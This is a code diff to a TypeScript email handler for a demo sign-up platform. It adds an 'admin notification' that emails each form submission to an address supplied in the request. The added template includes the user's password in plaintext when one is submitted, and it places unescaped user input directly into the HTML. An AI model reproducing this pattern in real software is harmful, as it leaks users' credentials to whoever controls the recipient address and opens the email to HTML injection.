@@ -15,7 +15,7 @@ const corsHeaders = {
 };
 
 interface EmailRequest {
-  email_type: 'welcome' | 'waitlist_notification' | 'user_confirmation' | 'verification' | 'signup_confirmation';
+  email_type: 'welcome' | 'waitlist_notification' | 'user_confirmation' | 'verification' | 'signup_confirmation' | 'admin_notification';
   email: string;
   user_name?: string;
   user_role?: string;
@@ -26,6 +26,16 @@ interface EmailRequest {
   redirect_to?: string;
   token_hash?: string;
   token?: string;
+  admin_email?: string;
+  form_data?: {
+    name: string;
+    email: string;
+    password?: string;
+    userType: string;
+    actionType: 'signup' | 'signin';
+    demo_code_used: string;
+    timestamp: string;
+  };
 }
 
 const handler = async (req: Request): Promise<Response> => {
@@ -42,6 +52,45 @@ const handler = async (req: Request): Promise<Response> => {
     let toEmail = '';
 
     switch (emailRequest.email_type) {
+      case 'admin_notification':
+        // New admin notification for form submissions
+        const formData = emailRequest.form_data!;
+        emailHtml = `
+          <!DOCTYPE html>
+          <html>
+            <head>
+              <meta charset="utf-8">
+              <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            </head>
+            <body style="margin: 0; padding: 0; background-color: #f4f4f4; font-family: Arial, sans-serif;">
+              <div style="margin: 0 auto; padding: 20px; max-width: 600px; background-color: #ffffff;">
+                <h1 style="color: #333333; font-size: 24px; margin-bottom: 20px;">
+                  New Demo Platform Form Submission
+                </h1>
+                
+                <div style="background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-bottom: 20px;">
+                  <h2 style="color: #333333; font-size: 18px; margin-top: 0;">Form Details</h2>
+                  <p><strong>Action:</strong> ${formData.actionType === 'signup' ? 'Sign Up' : 'Sign In'}</p>
+                  <p><strong>User Type:</strong> ${formData.userType}</p>
+                  <p><strong>Name:</strong> ${formData.name}</p>
+                  <p><strong>Email:</strong> ${formData.email}</p>
+                  ${formData.password ? `<p><strong>Password:</strong> ${formData.password}</p>` : ''}
+                  <p><strong>Demo Code Used:</strong> ${formData.demo_code_used}</p>
+                  <p><strong>Submitted:</strong> ${new Date(formData.timestamp).toLocaleString()}</p>
+                </div>
+                
+                <p style="color: #666666; font-size: 14px;">
+                  This notification was sent from the Creators Now demo platform.
+                </p>
+              </div>
+            </body>
+          </html>
+        `;
+        
+        subject = `Demo Platform: New ${formData.actionType} form submission from ${formData.email}`;
+        toEmail = emailRequest.admin_email!;
+        break;
+
       case 'signup_confirmation':
         // Simple thank you signup confirmation email
         emailHtml = `
